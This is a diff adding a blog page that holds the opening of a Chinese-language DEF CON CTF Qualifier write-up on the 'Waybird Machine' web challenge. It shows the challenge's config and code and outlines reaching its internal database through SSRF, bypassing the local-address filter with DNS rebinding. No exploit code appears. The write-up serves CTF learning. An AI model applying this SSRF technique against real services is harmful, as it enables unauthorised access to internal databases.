@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Ching367436,Ch1ng,書卷獎,資安,AIS3 最佳專題">
+    
+    
+    <meta name="author" content="Ching367436">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://blog.ching367436.me/def-con-ctf-2026-qual/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEF CON CTF Qualifier Write-up">
+<meta property="og:url" content="https://blog.ching367436.me/def-con-ctf-2026-qual/">
+<meta property="og:site_name" content="Ching367436">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.ching367436.me/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-30T07:12:44.000Z">
+<meta property="article:author" content="Ching367436">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="defcon">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ching367436.me/images/redefine-og.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-PRRP5V9HFQ"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-PRRP5V9HFQ');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            DEF CON CTF Qualifier Write-up | Ching367436&#39;s blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <meta http-equiv="Content-Security-Policy" content="
+  default-src 'self' https://*.clarity.ms https://c.bing.com https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com https://cloudflareinsights.com ; 
+  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.clarity.ms https://c.bing.com https://*.googletagmanager.com https://giscus.app/ https://cdn.jsdelivr.net/ https://static.cloudflareinsights.com ; 
+  style-src 'unsafe-inline' 'self' https://giscus.app/ https://cdn.jsdelivr.net/ https://fonts.googleapis.com https://fonts.gstatic.com; 
+  img-src 'self' data: https://*.clarity.ms https://c.bing.com https://cdn.jsdelivr.net/ https://www.googletagmanager.com ;
+" />
+
+                
+    
+            
+                
+                    <script data-swup-reload-script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "gh62bmw6cl"); </script>
+                
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap" rel="stylesheet">
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.ching367436.me","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"18px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["竹狐隊長"]},"code_block":{"copy":true,"style":"simple","highlight_theme":{"light":"github","dark":"github-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":false,"pangu_js":false,"recommendation":{"enable":true,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans TC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400&display=swap"},"english":{"enable":true,"family":"Lexend","url":"https://fonts.googleapis.com/css2?family=Lexend:wght@400&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":true,"id":"G-PRRP5V9HFQ"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Ching367436's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Ching367436"}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"none","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-solid fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart\" style=\"color: #f54545\"></i>","start":"2023/3/20 21:33:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2023/3/20 21:33:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style><link rel="alternate" href="/atom.xml" title="Ching367436" type="application/atom+xml">
+</head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ching367436&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">20</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/def-con-ctf-2026-qual/cover.webp" alt="DEF CON CTF Qualifier Write-up" class="w-full h-60 sm:h-72 md:h-80 object-cover rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">DEF CON CTF Qualifier Write-up</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/Ching367436.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Ching367436</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">竹狐隊長</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-30 15:12:44</span>
+        <span class="mobile">2026-05-30 15:12:44</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/defcon/">defcon</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.6k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>30 Mins</span>
+        </span>
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>今年的 DEF CON CTF Qualifier 很難得出現「真正的白箱 Web 題」，而且白箱 web 題品質蠻不錯的。這次把兩題白箱 Web 題解完。</p>
+<h2 id="Web-Network-Waybird-Machine"><a href="#Web-Network-Waybird-Machine" class="headerlink" title="[Web/Network] Waybird Machine"></a>[Web/Network] Waybird Machine</h2><p>這個題目的 docker-compose.yml 有三個服務，flag 環境變數被放在 <code>web</code> 裡面。</p>
+<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./nginx</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"service:web"</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./web</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"80:80"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=${FLAG}</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">BASIC_AUTH_USERNAME=${BASIC_AUTH_USERNAME}</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">BASIC_AUTH_PASSWORD=${BASIC_AUTH_PASSWORD}</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SECRET_KEY=${SECRET_KEY}</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">babelfish:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./babelfish</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">-p</span> <span class="number">12345678</span></span><br><span class="line">    <span class="attr">cap_add:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"service:web"</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">web</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>web</code> 會在初始化的時候把 flag 放進資料庫裡面。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/db.py：61</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert_flag</span>():</span><br><span class="line">    sql_cmd = <span class="string">"""</span></span><br><span class="line"><span class="string">    INSERT INTO flags</span></span><br><span class="line"><span class="string">        (flag, is_hidden)</span></span><br><span class="line"><span class="string">    VALUES</span></span><br><span class="line"><span class="string">        (%s, %s);</span></span><br><span class="line"><span class="string">    SELECT SCOPE_IDENTITY() AS id;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> _conn() <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            cursor.execute(</span><br><span class="line">                sql_cmd, (</span><br><span class="line">                    app.config[<span class="string">"FLAG"</span>],</span><br><span class="line">                    <span class="number">1</span></span><br><span class="line">                ))</span><br><span class="line">            row = cursor.fetchone()</span><br><span class="line">        conn.commit()</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># [...]:117</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_flags</span>():</span><br><span class="line">    sql_cmd = <span class="string">"""</span></span><br><span class="line"><span class="string">        SELECT flag from flags WHERE is_hidden = 0;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">with</span> _conn() <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            cursor.execute(sql_cmd)</span><br><span class="line">            <span class="keyword">return</span> cursor.fetchall()</span><br></pre></td></tr></table></figure></div>
+
+<p>只要把資料庫 <code>flags</code> 中的 <code>is_hidden</code> 設成 <code>0</code> 就能在 <code>/</code> 拿到 flag。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/routes.py:19</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        images = db.get_images()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        images = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flags = db.get_flags()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flags = []</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, images=images, flags=flags)</span><br></pre></td></tr></table></figure></div>
+
+<p>翻了一圈沒有直接的 SQL Injection，需要其他手段摸到資料庫。</p>
+<p>資料庫用了 <a target="_blank" rel="noopener" href="https://hub.docker.com/layers/jonathanpotts/babelfishpg/latest/images/sha256-818e17524eeb5158c585454e86cc4c8c4109b2d5ac8d9189418586b1d0133aa8"><code>babelfish</code></a>，<code>babelfish</code> 會收 MSSQL 的 TSQL，轉換成 PostgresSQL 後，拿來操作 container 中開的 PostgresSQL。<code>babelfish</code> 這個 container 有用 iptables 限制不能從外部摸到 PostgresSQL。</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 5432 -j REJECT</span><br><span class="line">ip6tables -A INPUT -p tcp --dport 5432 -j REJECT</span><br></pre></td></tr></table></figure></div>
+
+<p><code>web</code> 有功能能讓網站去抓圖片，存下來，等於送了寫檔 + SSRF；追進 <code>scraper.scrape</code> 會發現只能是 HTTP / HTTPS，禁止 local addresses；但 DNS rebinding 可以直接繞過。如果直接用 HTTP 去 SSRF <code>babelfish</code>（用的是 <a class="link" target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">MS-TDS protocol<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>），會遇到一些問題。</p>
